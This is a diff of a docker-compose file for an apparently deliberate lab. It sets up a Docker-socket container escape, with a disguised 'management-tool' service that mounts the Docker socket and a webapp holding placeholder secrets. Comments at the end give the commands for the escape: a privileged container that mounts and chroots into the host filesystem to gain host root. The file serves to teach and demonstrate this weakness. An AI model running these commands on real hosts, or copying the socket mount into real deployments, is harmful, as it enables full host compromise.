@@ -1,27 +1,53 @@
 version: '3.8'
+
 services:
+  # Innocent-looking container management tool
+  # Common in real environments for monitoring, backups, or CI/CD
+  container-manager:
+    image: docker:24-cli-alpine
+    container_name: management-tool
+    
+    # THE CRITICAL VULNERABILITY: Docker socket access
+    # This single mount gives complete control over the Docker daemon
+    volumes:
+      - /var/run/docker.sock:/var/run/docker.sock
+    
+    # Keeps container running for demonstration
+    command: tail -f /dev/null
+    
+    environment:
+      - TOOL_PURPOSE=container-monitoring
+    
+    restart: unless-stopped
+    
+    labels:
+      - "purpose=monitoring"
+
+  # Sample webapp containing secrets (demonstrates lateral movement target)
   webapp:
     build:
       context: .
       dockerfile: Dockerfile.vulnerable
-    image: vulnerable-app:latest
-    privileged: true
-    network_mode: host
-    pid: host
-    volumes:
-      - /var/run/docker.sock:/var/run/docker.sock
-      - /:/host
-    cap_add:
-      - SYS_ADMIN
-      - NET_ADMIN
-      - ALL
-    security_opt:
-      - seccomp:unconfined
-      - apparmor:unconfined
+    container_name: webapp
+    
     environment:
       - API_KEY=sk-production-key-exposed
       - DATABASE_PASSWORD=supersecret123
+      - JWT_SECRET=jwt-signing-key-2024
+    
     ports:
-      - "22:22"
       - "3000:3000"
-      - "8080:8080"
+    
+    labels:
+      - "contains-secrets=true"
+
+# ATTACK DEMONSTRATION:
+# =====================
+# 1. Start containers: docker-compose up -d
+# 2. Access management container: docker exec -it management-tool sh
+# 3. From INSIDE management-tool, create privileged container:
+#    docker run -it --rm --privileged --pid=host -v /:/hostfs alpine chroot /hostfs bash
+# 4. You are now ROOT on the HOST SYSTEM with full filesystem access!
+#
+# This demonstrates that JUST the Docker socket mount is sufficient
+# for complete host compromise, without needing any other privileges.
